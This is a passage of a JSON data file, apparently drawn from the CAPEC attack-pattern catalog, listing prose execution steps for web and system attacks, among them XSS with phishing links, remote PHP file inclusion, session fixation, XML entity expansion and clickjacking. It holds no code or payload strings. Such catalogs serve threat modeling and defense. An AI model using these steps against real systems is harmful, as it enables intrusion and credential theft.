        "step4": " [Forceful browsing] When the adversary targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).. - Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site. - Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities). ",
        "step5": " [Content spoofing] By manipulating the content, the adversary targets the information that the user would like to get from the website.. - Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes adversary-modified invalid information to the user on the current web page.\n"
    },
    {
        "id": 97,
        "capec_id": "190"
    },
    {
        "id": 98,
        "capec_id": "191"
    },
    {
        "id": 99,
        "capec_id": "192"
    },
    {
        "id": 100,
        "capec_id": "193",
        "step1": " [Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find.. - Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery. ",
        "step2": " [Attempt variations on input parameters] The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before. They send parameters that include variations of payloads which include a reference to the remote PHP script. They record all the responses from the server that include the output of the execution of remote PHP script.. - Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the adversary controlled remote PHP script.. - Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs. ",
        "step3": " [Run arbitrary server-side code] As the adversary succeeds in exploiting the vulnerability, they are able to execute server-side code within the application. The malicious code has virtual access to the same resources as the targeted application. Note that the adversary might include shell code in their script and execute commands on the server under the same privileges as the PHP runtime is running with.. - Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.\n"
    },
    {
        "id": 101,
        "capec_id": "194"
    },
    {
        "id": 102,
        "capec_id": "195"
    },
    {
        "id": 103,
        "capec_id": "196",
        "step1": " [Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.. - An attacker makes many anonymous connections and records the session IDs.. - An attacker makes authorized connections and records the session tokens or credentials. ",
        "step2": " [Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.. - The attacker manipulates the HTTP request message and adds their forged session IDs in to the requests or cookies. ",
        "step3": " [Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.. - The attacker loads the predefined or predicted session ID into their browser and browses to protected data or functionality.. - The attacker loads the predefined or predicted session ID into their software and utilizes functionality with the rights of the victim.\n"
    },
    {
        "id": 104,
        "capec_id": "197",
        "step1": " [Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using subsitituion on the victim's side.. - Use an automated tool to record all instances of URLs to process requests.. - Use a browser to manually explore the website and analyze how the application processes requests. ",
        "step2": " [Craft malicious payload] The adversary crafts a malicious message containing nested exponential expansion that completely uses up available server resources. See the Example Instances section for details on how to craft this malicious payload. ",
        "step3": " [Send the message] Send the malicious crafted message to the target URL.\n"
    },
    {
        "id": 105,
        "capec_id": "198",
        "step1": " [Survey the application for user-controllable inputs as URL parameters] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application, looking for URLs which use parameters.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Cause application to return error page] The adversary uses the URLs gathered in the Explore phase as a target list and injects various common script payloads and special characters into the parameters to see if an error page occurs, and if the injected payload is executed by the error page.. - Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs.. - Use a list of HTML special characters to inject into parameters of known URLs and check if they caused errors ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS through an error page, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter to include a malicious script tag.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 106,
        "capec_id": "199",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery. ",
        "step2": " [Probe identified potential entry points for XSS vulnerability] Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before using alternate syntax. These inputs are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and try many variations of characters injection that would enable the XSS payload. They record all the responses from the server that include unmodified versions of their script.. - Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax & encoding.. - Use a proxy tool to record results of manual input of XSS probes in known URLs. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter to include a malicious script tag created using alternate syntax to bypass filters.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 107,
        "capec_id": "2",
        "step1": " [Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout. - Analyze system documentation to find list of events that could potentially cause account lockout. - Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly. - Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out. ",
        "step2": " [Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out. - Obtain list of authorized users using another attack pattern, such as SQL Injection.. - Attempt to create accounts if possible; system should indicate if a user ID is already taken.. - Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts. ",
        "step3": " [Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.. - For each user ID to be locked out, perform the lockout procedure discovered in the first step.\n"
    },
    {
        "id": 108,
        "capec_id": "20",
        "step1": " Determine the ciphertext and the encryption algorithm. ",
        "step2": " Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.\n"
    },
    {
        "id": 109,
        "capec_id": "200"
    },
    {
        "id": 110,
        "capec_id": "201",
        "step1": " [Survey the target] Using a browser or an automated tool, an adversary records all instances of web services that process requests with serialized data.. - Use an automated tool to record all instances of URLs that process requests with serialized data.. - Use a browser to manually explore the website and analyze how the application processes serialized data requests. ",
        "step2": " [Craft malicious payload] The adversary crafts malicious data message that contains references to sensitive files. ",
        "step3": " [Launch an External Linking attack] Send the malicious crafted message containing the reference to a sensitive file to the target URL.\n"
    },
    {
        "id": 111,
        "capec_id": "202"
    },
    {
        "id": 112,
        "capec_id": "203"
    },
    {
        "id": 113,
        "capec_id": "204",
        "step1": " [Identify Application Cache] An adversary first identifies an application that utilizes a cache. This could either be a web application storing data in a browser cache, or an application running on a separate machine. The adversary examines the cache to determine file permissions and possible encryption.. - Use probing tools to look for application cache files on a machine.. - Use a web application and determine if any sensitive information is stored in browser cache. ",
        "step2": " [Attempt to Access Cache] Once the cache has been discovered, the adversary attempts to access the cached data. This often requires previous access to a machine hosting the target application.. - Use priviledge escalation to access cache files that might have strict privileges.. - If the application cache is encrypted with weak encryption, attempt to understand the encryption technique and break the encryption. ",
        "step3": " [Lift Sensitive Data from Cache] After gaining access to cached data, an adversary looks for potentially sensitive information and stores it for malicious use. This sensitive data could possibly be used in follow-up attacks related to authentication or authorization.. - Using a public computer, or gaining access to a victim's computer, examine browser cache to look for sensitive data left over from previous sessions.\n"
    },
    {
        "id": 114,
        "capec_id": "205"
    },
    {
        "id": 115,
        "capec_id": "206",
        "step1": " The adversary first attempts to obtain a digital certificate in order to sign their malware or tools. This certificate could be stolen, created by the adversary, or acquired normally through a certificate authority. ",
        "step2": " Based on the type of certificate obtained, the adversary will create a goal for their attack. This is either a broad or targeted attack. If an adversary was able to steal a certificate from a targeted organization, they could target this organization by pretending to have legitimate code signed by them. In other cases, the adversary would simply sign their malware and pose as legitimate software such that any user might trust it. This is the more broad approach ",
        "step3": " The adversary creates their malware and signs it with the obtained digital certificate. The adversary then checks if the code that they signed is valid either through downloading from the targeted source or testing locally. ",
        "step4": " Once the malware has been signed, it is then deployed to the desired location. They wait for a trusting user to run their malware, thinking that it is legitimate software. This malware could do a variety of things based on the motivation of the adversary.\n"
    },
    {
        "id": 116,
        "capec_id": "207",
        "step1": " [Probing] The attacker probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.. - The attacker probes by exploring an application's functionality and its underlying mapping to server-side components.. - The attacker reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation. ",
        "step2": " [Determine which functionality to disable or remove] The attacker tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.. - The attacker reverse engineers the client-side code to determine which functionality to disable or remove. ",
        "step3": " [Disable or remove the critical functionality from the client code] Once the functionality has been determined, the attacker disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.. - The attacker disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.\n"
    },
    {
        "id": 117,
        "capec_id": "208"
    },
    {
        "id": 118,
        "capec_id": "209",
        "step1": " [Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.. - Use a spidering tool to follow and record all links and analyze the web pages to file upload features. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the Explore phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.. - Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing. ",
        "step3": " [Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.. - Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks. ",
        "step4": " [Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.. - Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.. - Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.\n"
    },
    {
        "id": 119,
        "capec_id": "21",
        "step1": " [Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target, the adversary probes for cookies, session tokens, or entry points that bypass identifiers altogether.. - Spider all available pages. - Attack known bad interfaces. - Search outward-facing configuration and properties files for identifiers. ",
        "step2": " [Fetch samples] The adversary fetches many samples of identifiers. This may be through legitimate access (logging in, legitimate connections, etc.) or via systematic probing.. - An adversary makes many anonymous connections and records the session IDs assigned.. - An adversary makes authorized connections and records the session tokens or credentials issued.. - An adversary gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connection from it, attempting to gain the same privileges as a trusted system. ",
        "step3": " [Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application ",
        "step4": " [Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks. ",
        "step5": " [Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.\n"
    },
    {
        "id": 120,
        "capec_id": "211"
    },
    {
        "id": 121,
        "capec_id": "212"
    },
    {
        "id": 122,
        "capec_id": "213"
    },
    {
        "id": 123,
        "capec_id": "214"
    },
    {
        "id": 124,
        "capec_id": "215",
        "step1": " [Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.. - Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.. - Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.. - Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.) ",
        "step2": " [Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.. - Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).. - Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system. ",
        "step3": " [Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that might provide information to map the application ",
        "step4": " [Craft exploit payloads] An adversary usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the adversary may try changing the origin IP addresses or client browser identification strings or start a new session from where they left off in obfuscating the attack.. - Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.. - If the application rejects the large amount of fuzzing messages from the same host machine, the adversary needs to hide the attacks by changing the IP addresses or other credentials.\n"
    },
    {
        "id": 125,
        "capec_id": "216"
    },
    {
        "id": 126,
        "capec_id": "217",
        "step1": " [Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.. - If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being used. ",
        "step2": " [Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).. - Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.. - If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.. - Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack. ",
        "step3": " [Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.. - Use known exploits for old SSL and TLS versions.. - Use known exploits for weak ciphers such as DES and RC4.\n"
    },
    {
        "id": 127,
        "capec_id": "218"
    },
    {
        "id": 128,
        "capec_id": "219",
        "step1": " [Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.. - Use automated tool to record all instances to process XML requests or find exposed WSDL.. - Use tools to crawl WSDL ",
        "step2": " [Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.. - Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not. ",
        "step3": " [Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).. - The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message.\n"
    },
    {
        "id": 129,
        "capec_id": "22"
    },
    {
        "id": 130,
        "capec_id": "220"
    },
    {
        "id": 131,
        "capec_id": "221",
        "step1": " [Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML. ",
        "step2": " [Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang. ",
        "step3": " [Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file. ",
        "step4": " [Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.\n"
    },
    {
        "id": 132,
        "capec_id": "222",
        "step1": " [Craft an iFrame Overlay page] The attacker crafts a malicious iFrame overlay page.. - The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page. ",
        "step2": " [Attacker tricks victim to load the iFrame overlay page] Attacker utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.. - Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.. - Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.. - Trick the victim to the malicious site through a cross-site scripting attack. ",
        "step3": " [Trick victim into interacting with the iFrame overlay page in the desired manner] The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.. - Hide action controls over very commonly used functionality.. - Hide action controls over very psychologically tempting content.\n"
    },
    {
        "id": 133,
        "capec_id": "224"
    },
    {
        "id": 134,
        "capec_id": "226"
    },
    {
        "id": 135,
        "capec_id": "227"
    },
    {
        "id": 136,
        "capec_id": "228",
        "step1": " [Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.. - Use an automated tool to record all instances of URLs to process XML requests.. - Use a browser to manually explore the website and analyze how the application processes XML requests. ",
        "step2": " [Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.. - Examine any available documentation for the application that discusses expected XML input.. - Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD. ",
        "step3": " [Craft and inject XML containg malicious DTD payload]. - Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.. - Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.\n"
    },
    {
        "id": 137,
        "capec_id": "229",
        "step1": " [Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process requests using serialized data.. - Use an automated tool to record all instances of URLs to process requests from serialized data.. - Use a browser to manually explore the website and analyze how the application processes requests using serialized data. ",
        "step2": " [Launch a Blowup attack] The attacker crafts malicious messages that contain multiple configuration parameters in the same dataset.. - Send the malicious crafted message containing the multiple configuration parameters to the target URL, causing a denial of service.\n"
    },
    {
        "id": 138,
        "capec_id": "23"
    },
    {
        "id": 139,
        "capec_id": "230",
        "step1": " An adversary determines the input data stream that is being processed by a data parser that supports using substitution on the victim's side. ",
        "step2": " An adversary crafts input data that may have an adverse effect on the operation of the parser when the data is parsed on the victim's system.\n"
    },
    {
        "id": 140,
        "capec_id": "231",
        "step1": " An adversary determines the input data stream that is being processed by an serialized data parser on the victim's side. ",
        "step2": " An adversary crafts input data that may have an adverse effect on the operation of the data parser when the data is parsed on the victim's system.\n"
    },
    {
        "id": 141,
        "capec_id": "233"
    },
    {
        "id": 142,
        "capec_id": "234",
        "step1": " [Find process with elevated priveleges] The adversary probes for processes running with elevated privileges.. - On Windows, use the process explorer's security tab to see if a process is running with administror privileges.. - On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user. ",
        "step2": " [Find vulnerability in running process] The adversary looks for a vulnerability in the running process that would allow for arbitrary code execution with the privilege of the running process.. - Look for improper input validation. - Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.. - Utilize system utilities that support process control that have been inadequately secured ",
        "step3": " [Execute arbitrary code] The adversary exploits the vulnerability that they have found and hijacks the running process.\n"
    },
    {
        "id": 143,
        "capec_id": "235"
    },
    {
        "id": 144,
        "capec_id": "236"
    },
    {
        "id": 145,
        "capec_id": "237",
        "step1": " [Probing] The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.. - The attacker probes the target application to see whether calling code of another language is allowed within a sandbox. ",
        "step2": " [Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.. - The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox. ",
        "step3": " [Verify the exploitable security weaknesses] The attacker tries to craft malicious code of another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.. - The attacker tries to explore the security weaknesses by calling malicious code of another language allowed by the sandbox. ",
        "step4": " [Exploit the security weaknesses in the standard libraries] The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.. - The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries.\n"
    },
    {
        "id": 146,
        "capec_id": "238"
    },
    {
        "id": 147,
        "capec_id": "239"
    },
    {
        "id": 148,
        "capec_id": "24",
        "step1": " [Survey] The attacker surveys the target application, possibly as a valid and authenticated user. - Spidering web sites for inputs that involve potential filtering. - Brute force guessing of filtered inputs ",
        "step2": " [Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.. - Brute force attack through black box penetration test tool.. - Fuzzing of communications protocols. - Manual testing of possible inputs with attack data. ",
        "step3": " [Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?. - Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.. - Check Log files. An attacker with access to log files can look at the outcome of bad input. ",
        "step4": " [Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.. - DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.. - Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.. - An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.\n"
    },
    {
        "id": 149,
        "capec_id": "240"
    },
    {
        "id": 150,
        "capec_id": "241"
    },
    {
        "id": 151,
        "capec_id": "242"
    },
    {
        "id": 152,
        "capec_id": "243",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS targeting HTML attributes] The adversary uses the entry points gathered in the Explore phase as a target list and injects various malicious expressions as input, hoping to embed them as HTML attributes.. - Inject single and double quotes into URL parameters or other inputs to see if they are filtered out. Also use URL encoding to bypass filters.. - Use single or double quotes to close attribute evaluation and enter a new attribute that contains an expression. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 153,
        "capec_id": "244",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery. ",
        "step2": " [Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads formatted as data URI schemes using base to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.. - Use a proxy tool to record results of manual input of XSS probes in known URLs. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter to include a malicious payload formatted as a URI scheme, or use the URL returned when the URI scheme was given as input to the web application.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 154,
        "capec_id": "245",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS using double characters] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads modified to use double characters and doubled special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.. - Use a list of XSS probe strings using double characters to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs.. - Use a list of doubled HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 155,
        "capec_id": "246"
    },
    {
        "id": 156,
        "capec_id": "247",
        "step1": " [Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery. ",
        "step2": " [Probe identified potential entry points for XSS vulnerabilities using invalid characters] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters preceded by an invalid character(s) to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. The adversary is looking for cases where an invalid character causes an input filter to stop processing, allowing the malicious input that follows to bypass the filter. - Use a list of XSS probe strings preceded by an invalid character(s) such as null, carriage return, line feed, or tab to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.. - Use a proxy tool to record results of manual input of XSS probes in known URLs.. - Use a list of HTML special characters preceded by an invalid character(s) to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out. ",
        "step3": " [Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.. - Change a URL parameter to include a malicious script tag preceded by invalid character(s).. - Send information gathered from the malicious script to a remote endpoint. ",
        "step4": " [Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.. - Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.. - Put the malicious URL on a public forum, where many victims might accidentally click the link.\n"
    },
    {
        "id": 157,
        "capec_id": "248"
    },
    {
        "id": 158,
        "capec_id": "249"
    },
    {
        "id": 159,
        "capec_id": "25",
        "step1": " The adversary initiates an exploratory phase to get familiar with the system. ",
